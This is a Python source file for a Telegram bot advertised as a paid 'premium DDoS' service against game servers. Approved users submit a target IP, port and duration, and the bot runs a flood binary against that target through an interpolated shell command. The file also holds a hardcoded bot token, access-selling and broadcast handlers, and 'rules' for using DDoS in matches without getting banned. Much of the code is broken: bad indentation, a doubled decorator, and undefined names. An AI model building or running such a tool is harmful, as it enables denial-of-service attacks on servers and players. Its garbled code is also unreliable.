import telebot
import subprocess
import datetime
import os
import datetime
import time
import os
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# insert your Telegram bot token here
bot = telebot.TeleBot('7245792876:AAHkoQ-wR11kD3gu0ufXvcTQMNgkU_cn3qw')

# Admin user IDs
admin_id = ["1715564768"]

# File to store allowed user IDs
USER_FILE = "users.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

   
    blocked_ports = [8700, 20000, 443,17500, 9031, 20002, 20001]

async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./bgmi {target_ip} {target_port} {duration} 110"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        # Process stdout and stderr
        output = stdout.decode().replace("", "@RIYAZ_5U")  # Replace with your name
        error = stderr.decode()

        # Log output and errors for debugging
        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")
            bot.send_message(chat_id, "Error occurred while running the attack. Check logs for more details.")
            return

        # Notify success only if there's no error
        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
        bot.send_message(chat_id, "Failed to execute the attack. Please try again later.")

# Attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @RIYAZ_5U", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*please provide the details for the following format:\n<ip><port><time>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        
        # Ensure we have 3 arguments
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: <ip><port><time>*", parse_mode='Markdown')
            return
        
        target_ip = args[0]
        
        # Validate that the port is an integer
        try:
            target_port = int(args[1])
        except ValueError:
            bot.send_message(chat_id, "*Port must be a valid number.*", parse_mode='Markdown')
            return
        
        # Validate that the duration is an integer
        try:
            duration = int(args[2])
        except ValueError:
            bot.send_message(chat_id, "*Duration must be a valid number.*", parse_mode='Markdown')
            return

        # Check if the port is blocked
        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Run the attack command asynchronously
        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds\nAttacker Name: {user_name}")
        
    
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your command.*", parse_mode='Markdown')
    
    @bot.message_handler(func=lambda message: message.text == "Attack🚀")
def attack_button_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @RIYAZ_5U", parse_mode='Markdown')
        return

    # Check if the user's key is still valid
    valid_until = datetime.fromisoformat(found_user['valid_until'])
    if datetime.now() > valid_until:
        bot.send_message(chat_id, "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @RIYAZ_5U", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*please provide the details for the following format:\n<ip><port><time>.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack button: {e}")
    
# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=31 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "𝙏𝙍𝙔 𝙏𝙊 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍𝙎 𝘼𝘾𝘾𝙀𝙎𝙎 𝙏𝙄𝙈𝙀\n★[ʟɪᴋᴇ --> 1 ᴅᴀʏꜱ , 2 ᴅᴀʏꜱ , 1 ᴡᴇᴇᴋ]★"
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @RIYAZ_5U"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@@bot.message_handler(func=lambda message: message.text == "My Info ℹ️")
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>`{user_id}`</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙍𝙀𝙈𝙊𝙑𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👍"
            else:
                response = f"𝙐𝙎𝙀𝙍 𝘿𝘼𝙏𝘼 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
        else:
            response = '''ᴛʀʏ ᴛᴏ ᴛʜɪꜱ ᴛʏᴘᴇ --> /ʀᴇᴍᴏᴠᴇ (ᴜꜱᴇʀ_ɪᴅ)'''
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐"

    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
        except FileNotFoundError:
            response = "𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿"
    else:
        response = "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇ ʙʏ ᴀᴅᴍɪɴ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ --> @RIYAZ_5U"
    bot.reply_to(message, response)



    @bot.message_handler(commands=['start'])
def send_welcome(message):
    username = message.from_user.username or "N/A"
    welcome_message = f"ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏ𝙨 ʙᴏᴛ, {user_name}! ᴛʜɪ𝙨 ɪ𝙨 ʜɪɢʜ ǫᴜᴀʟɪᴛʏ 𝙨ᴇʀᴠᴇʀ ʙᴀ𝙨ᴇᴅ ᴅᴅᴏ𝙨. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇ𝙨𝙨."
    
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Attack🚀"), KeyboardButton("My Info ℹ️"),
               KeyboardButton("Buy Access! 💰 🙋🏻"), KeyboardButton("Rules 🔰"))
    
    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)
    
    
    
    @bot.message_handler(func=lambda message: message.text == "Buy Access! 💰 🙋🏻")
def send_buy(message):
    buy_message = "For Access, Please Contact @riyaz_5u."
    bot.send_message(message.chat.id, buy_message)
    
    
@bot.message_handler(func=lambda message: message.text == "Rules 🔰")
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''🔴Important message ⛔\n\n

❗Now Don't Use Obb Your Main I'd Use Only Second I'd For Fun\n

DDOS SAFE H RULE K SATH
DDOS RULES👇👇\n
PLAY WITH DDOS 3 MATCHES 
THEN👇⬇️\n
PLAY 2 MATCHES WITHOUT DDOS
THEN 👇⬇️\n
PLAY 3 TDM 
THEN 👇⬇️\n
✅✅AFTER DDOS FOLLOW THIS RULES YOUR ID ARE 100% SAFE✅✅'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        